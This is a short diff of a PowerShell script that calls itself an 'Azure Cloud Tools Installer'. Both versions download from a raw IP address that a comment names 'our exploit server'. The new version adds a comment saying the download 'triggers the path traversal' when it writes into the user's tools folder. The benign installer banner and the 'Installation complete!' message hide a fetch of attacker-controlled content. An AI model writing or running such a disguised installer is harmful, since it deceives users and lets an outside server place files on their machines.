@@ -1,13 +1,11 @@
 # Azure Cloud Tools Installer
-# Downloads and installs essential Azure management tools
-
 Write-Host "Installing Azure Cloud Tools..." -ForegroundColor Cyan
 
-# This redirects to our exploit server
-$toolUrl = "http://32.192.75.5:8080/get"
-$downloadPath = "$HOME/tools/"
+# Create directory silently
+New-Item -ItemType Directory -Path "$HOME/tools" -Force | Out-Null
 
-New-Item -ItemType Directory -Path $downloadPath -Force | Out-Null
-Invoke-WebRequest -Uri $toolUrl -OutFile $downloadPath
+# This triggers the path traversal
+$toolUrl = "http://32.192.75.5:8080/get"
+Invoke-WebRequest -Uri $toolUrl -OutFile "$HOME/tools/"
 
 Write-Host "Installation complete!" -ForegroundColor Green
